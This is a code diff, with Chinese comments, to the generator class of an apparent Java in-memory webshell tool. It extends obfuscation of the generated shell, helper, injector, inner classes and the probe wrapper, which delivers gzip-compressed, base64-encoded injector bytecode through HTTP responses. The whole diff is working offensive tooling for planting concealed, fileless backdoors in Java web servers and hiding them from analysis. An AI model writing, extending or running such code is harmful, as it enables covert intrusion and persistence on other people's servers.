@@ -4,20 +4,18 @@ import com.reajason.javaweb.GenerationException;
 import com.reajason.javaweb.ShellGenerator;
 import com.reajason.javaweb.memshell.config.InjectorConfig;
 import com.reajason.javaweb.memshell.config.ObfuscationConfig;
+import com.reajason.javaweb.memshell.config.ObfuscationScope;
 import com.reajason.javaweb.memshell.config.ShellConfig;
 import com.reajason.javaweb.memshell.config.ShellToolConfig;
 import com.reajason.javaweb.memshell.generator.InjectorGenerator;
 import com.reajason.javaweb.memshell.obfuscation.ClassObfuscation;
+import com.reajason.javaweb.memshell.obfuscation.MethodContracts;
 import com.reajason.javaweb.memshell.obfuscation.ObfuscationInfo;
 import com.reajason.javaweb.memshell.obfuscation.ObfuscationTarget;
 import com.reajason.javaweb.memshell.server.AbstractServer;
 import com.reajason.javaweb.memshell.spi.ShellToolProvider;
-import com.reajason.javaweb.probe.ProbeContent;
-import com.reajason.javaweb.probe.ProbeMethod;
 import com.reajason.javaweb.probe.config.ProbeConfig;
-import com.reajason.javaweb.probe.config.ResponseConfig;
 import com.reajason.javaweb.probe.generator.response.ResponseGenerator;
-import com.reajason.javaweb.utils.Base64Utils;
 import com.reajason.javaweb.utils.CommonUtil;
 import com.reajason.javaweb.utils.StringUtils;
 import com.reajason.javaweb.utils.tuple.Pair;
@@ -120,19 +118,40 @@ public class MemShellGenerator {
         byte[] shellBytes = generateShellBytes(shellConfig, shellToolConfig);
         shellBytes = server.postProcessShellBytes(shellBytes, shellConfig, shellToolConfig, injectorConfig);
 
-        // 混淆时序 1：必须在 postProcessShellBytes 改写完成之后、注入器 gzip+base64 嵌入之前
+        boolean obfuscationEnabled = shellConfig.isObfuscationEnabled();
+        ObfuscationScope obfuscationScope = shellConfig.getObfuscationScope();
+        byte[] helperClassBytes = injectorConfig.getHelperClassBytes();
+
+        // shell/helper 都在 InjectorGenerator gzip+base64 嵌入前处理；helper 的返回副本与嵌入副本因此一致。
         ObfuscationInfo obfuscationInfo = null;
-        if (shellConfig.isObfuscationEnabled()) {
+        if (obfuscationEnabled) {
             obfuscationInfo = ObfuscationInfo.builder().enabled(true).build();
-            obfuscationInfo.setOriginalShellSize(shellBytes.length);
-            shellBytes = ClassObfuscation.obfuscate(
-                    shellBytes, shellToolConfig.getShellClassName(),
-                    shellConfig.getTargetJreVersion(), ObfuscationTarget.SHELL,
-                    shellObfuscationConfig(shellConfig, server),
-                    server.getShellMethodContracts(shellConfig.getShellType()),
-                    server.getShellFieldContracts(shellConfig.getShellType()),
-                    Collections.<String, byte[]>emptyMap(), true);
-            obfuscationInfo.setObfuscatedShellSize(shellBytes.length);
+            if (obfuscationScope.includesMemshell()) {
+                ObfuscationConfig containerObfuscationConfig = containerObfuscationConfig(shellConfig, server);
+                obfuscationInfo.setOriginalShellSize(shellBytes.length);
+                Map<String, byte[]> shellRelatedClasses = new LinkedHashMap<String, byte[]>();
+                if (helperClassBytes != null) {
+                    shellRelatedClasses.put("helper", helperClassBytes);
+                }
+                shellBytes = ClassObfuscation.obfuscate(
+                        shellBytes, shellToolConfig.getShellClassName(),
+                        shellConfig.getTargetJreVersion(), ObfuscationTarget.SHELL,
+                        containerObfuscationConfig,
+                        server.getShellMethodContracts(shellConfig.getShellType()),
+                        server.getShellFieldContracts(shellConfig.getShellType()),
+                        shellRelatedClasses, true);
+                obfuscationInfo.setObfuscatedShellSize(shellBytes.length);
+
+                if (obfuscationScope.includesHelperAndWrapper() && helperClassBytes != null) {
+                    Map<String, byte[]> helperRelatedClasses = Collections.<String, byte[]>singletonMap("shell", shellBytes);
+                    helperClassBytes = ClassObfuscation.obfuscate(
+                            helperClassBytes, helperClassName(helperClassBytes),
+                            shellConfig.getTargetJreVersion(), ObfuscationTarget.HELPER,
+                            containerObfuscationConfig, MethodContracts.CONSERVATIVE,
+                            helperRelatedClasses, true);
+                    injectorConfig.setHelperClassBytes(helperClassBytes);
+                }
+            }
         }
 
         injectorConfig.setInjectorTemplateClassName(injectorTemplateClassName);
@@ -146,52 +165,60 @@ public class MemShellGenerator {
         boolean probeMode = shellConfig.getProbe() != null
                 && !shellConfig.getShellType().startsWith(ShellType.AGENT);
 
-        // 混淆时序 2：InjectorGenerator 生成完整字节码之后；probe 模式下混淆作用于内嵌 injector，
-        // 外层回显 Wrapper 保持轻量原样。inner/helper 作为 relatedClasses 触发跨类引用保护。
-        if (shellConfig.isObfuscationEnabled()) {
+        // 注入器按完整产物组处理。每个类都以其余原始类为扫描输入，双向保护直接方法/字段引用；
+        // 类名保持不变，RawWsHelper 与 Dubbo 的派生类名契约不受影响。
+        if (obfuscationEnabled && obfuscationScope.includesInjector()) {
             obfuscationInfo.setOriginalInjectorSize(injectorBytes.length);
-            Map<String, byte[]> relatedClasses = new LinkedHashMap<String, byte[]>(innerClassBytes);
-            byte[] helperClassBytes = injectorConfig.getHelperClassBytes();
+            byte[] originalInjectorBytes = injectorBytes;
+            Map<String, byte[]> originalInnerClassBytes = new LinkedHashMap<String, byte[]>(innerClassBytes);
+            Map<String, byte[]> relatedClasses = new LinkedHashMap<String, byte[]>(originalInnerClassBytes);
             if (helperClassBytes != null) {
                 relatedClasses.put("helper", helperClassBytes);
             }
-            // 可嵌入体积校验只针对真正会被 gzip+base64 嵌入回显 Wrapper 的产物，
-            // 与下方 Wrapper 包装条件保持一致（Agent 类型不走 Wrapper，不做该校验）
+            // 可嵌入体积校验只针对真正会被 gzip+base64 嵌入回显 Wrapper 的产物。
             injectorBytes = ClassObfuscation.obfuscate(
                     injectorBytes, injectorConfig.getInjectorClassName(),
                     shellConfig.getTargetJreVersion(), ObfuscationTarget.INJECTOR, shellConfig.getObfuscation(),
                     server.getInjectorMethodContracts(shellConfig.getShellType()), relatedClasses, probeMode);
             obfuscationInfo.setObfuscatedInjectorSize(injectorBytes.length);
+
+            Map<String, byte[]> obfuscatedInnerClassBytes = new LinkedHashMap<String, byte[]>();
+            for (Map.Entry<String, byte[]> entry : originalInnerClassBytes.entrySet()) {
+                Map<String, byte[]> companionRelatedClasses = new LinkedHashMap<String, byte[]>(originalInnerClassBytes);
+                companionRelatedClasses.remove(entry.getKey());
+                companionRelatedClasses.put("injector", originalInjectorBytes);
+                if (helperClassBytes != null) {
+                    companionRelatedClasses.put("helper", helperClassBytes);
+                }
+                byte[] companionBytes = ClassObfuscation.obfuscate(
+                        entry.getValue(), entry.getKey(), shellConfig.getTargetJreVersion(),
+                        ObfuscationTarget.INJECTOR, shellConfig.getObfuscation(),
+                        MethodContracts.CONSERVATIVE, companionRelatedClasses, false);
+                obfuscatedInnerClassBytes.put(entry.getKey(), companionBytes);
+            }
+            innerClassBytes = obfuscatedInnerClassBytes;
         }
 
         if (probeMode) {
             ProbeConfig probeConfig = shellConfig.getProbe();
-            ProbeMethod probeMethod = probeConfig.getProbeMethod();
-            if (probeMethod == null) {
-                probeMethod = ProbeMethod.ResponseBody;
-                probeConfig.setProbeMethod(probeMethod);
-            }
-            if (probeMethod != ProbeMethod.ResponseBody && probeMethod != ProbeMethod.ResponseHeader) {
-                throw new GenerationException("memshell probeMethod must be ResponseBody or ResponseHeader: " + probeMethod);
-            }
-            probeConfig.setShellClassName(injectorConfig.getInjectorClassName() + "Wrapper");
-            probeConfig.setProbeContent(ProbeContent.Bytecode);
             probeConfig.setTargetJreVersion(shellConfig.getTargetJreVersion());
             probeConfig.setByPassJavaModule(shellConfig.isByPassJavaModule());
             probeConfig.setShrink(shellConfig.isShrink());
             probeConfig.setDebug(shellConfig.isDebug());
             probeConfig.setStaticInitialize(injectorConfig.isStaticInitialize());
-            ResponseConfig responseConfig = ResponseConfig.builder()
-                    .server(serverName)
-                    .base64Bytes(Base64Utils.encodeBase64String(CommonUtil.gzipCompress(injectorBytes)))
-                    .respHeaderName(probeConfig.getRespHeaderName())
-                    .build();
-            injectorBytes = new ResponseGenerator(probeConfig, responseConfig).getBytes();
-            probeConfig.setRespHeaderName(responseConfig.getRespHeaderName());
+            injectorBytes = ResponseGenerator.wrapBytecode(probeConfig, serverName,
+                    injectorConfig.getInjectorClassName() + "Wrapper", injectorBytes);
             injectorConfig.setInjectorClassName(probeConfig.getShellClassName());
+            if (obfuscationEnabled && obfuscationScope.includesHelperAndWrapper()) {
+                injectorBytes = ClassObfuscation.obfuscate(
+                        injectorBytes, injectorConfig.getInjectorClassName(),
+                        shellConfig.getTargetJreVersion(), ObfuscationTarget.PROBE,
+                        shellConfig.getObfuscation(), MethodContracts.PROBE_COMMON,
+                        Collections.<String, byte[]>emptyMap(), false);
+            }
         }
 
-        byte[] helperClassBytes = injectorConfig.getHelperClassBytes();
+        helperClassBytes = injectorConfig.getHelperClassBytes();
         return MemShellResult.builder()
                 .shellConfig(shellConfig)
                 .shellToolConfig(shellToolConfig)
@@ -226,13 +253,13 @@ public class MemShellGenerator {
     }
 
     /**
-     * 合并 server 声明的 shell 混淆选项覆盖，server 覆盖优先。
+     * 合并 server 声明的 shell/helper 混淆选项覆盖，server 覆盖优先。
      * <p>
-     * 仅作用于 shell：Agent shell 可能被注入器 defineClass 进容器/OSGi 类加载器，
+     * 仅作用于 shell 与 helper：它们可能被注入器 defineClass 进容器/OSGi 类加载器，
      * 那里未必能解析 {@code javax.crypto}；注入器自身跑在 attach 进来的 system loader
      * 中，JDK 包可见，仍保留用户配置（包括 AES）。
      */
-    private static ObfuscationConfig shellObfuscationConfig(ShellConfig shellConfig, AbstractServer server) {
+    private static ObfuscationConfig containerObfuscationConfig(ShellConfig shellConfig, AbstractServer server) {
         ObfuscationConfig obfuscation = shellConfig.getObfuscation();
         if (obfuscation == null || !obfuscation.isEnabled()) {
             return obfuscation;
@@ -248,7 +275,7 @@ public class MemShellGenerator {
                 LOG.warning("Shell obfuscation option " + override.getKey() + "=" + override.getValue()
                         + " overrides configured value " + previous + " for " + shellConfig.getServer()
                         + " shell type " + shellConfig.getShellType()
-                        + " (shell is defined in a restricted container classloader)");
+                        + " (shell/helper are defined in a restricted container classloader)");
             }
         }
         return ObfuscationConfig.enabled(options);
